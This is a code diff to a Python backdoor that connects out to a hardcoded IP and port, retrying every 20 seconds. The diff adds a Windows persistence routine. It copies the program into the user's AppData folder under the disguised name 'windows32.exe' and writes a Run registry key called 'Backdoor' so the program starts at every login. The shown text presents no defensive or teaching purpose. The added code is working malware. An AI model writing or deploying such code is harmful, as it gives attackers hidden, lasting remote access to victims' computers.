@@ -9,14 +9,25 @@ import subprocess
 import os
 import time
 import ctypes
+import sys
+import shutil
 
 ip = "172.25.191.60"
 port = 8080
+
+def registry():
+    if os.name == "nt": 
+        location = os.environ['appdata']+'\\windows32.exe'
+        if not os.path.exists(location):
+            shutil.copyfile (sys.executable, location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'
+                            + location + '"', shell=True)
 
 def initiate():
     tuneConnection()
 
 def tuneConnection():
+    registry()
     # Trying to connect to server every 20 seconds
     while True:
         try:
